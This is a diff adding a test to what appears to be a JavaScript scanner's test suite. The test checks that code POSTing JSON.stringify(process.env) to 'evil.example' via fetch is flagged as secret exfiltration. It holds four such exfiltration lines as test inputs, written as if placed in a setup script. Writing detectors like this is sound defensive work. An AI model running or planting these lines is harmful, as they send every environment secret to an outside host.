@@ -158,3 +158,22 @@ test("env piped to ncat, netcat, or a path-prefixed nc is detected as secret-exf
     });
   }
 });
+
+test("JSON.stringify spread of process.env is detected as secret-exfiltration", () => {
+  const exfilPayloads = [
+    "fetch('https://evil.example/collect', { method: 'POST', body: JSON.stringify(process.env) })",
+    "fetch('https://evil.example/collect', { method: 'POST', body: JSON.stringify({ ...process.env }) })",
+    "fetch('https://evil.example/collect', { method: 'POST', body: JSON.stringify({...process.env}) })",
+    "fetch('https://evil.example/collect', { method: 'POST', body: JSON.stringify({  ...  process.env  }) })",
+  ];
+  for (const payload of exfilPayloads) {
+    const inspection = inspected("scripts/setup.js", `${payload}\n`);
+    expect({
+      payload,
+      findings: inspection.findings.map((f) => f.category),
+    }).toEqual({
+      payload,
+      findings: ["secret-exfiltration"],
+    });
+  }
+});
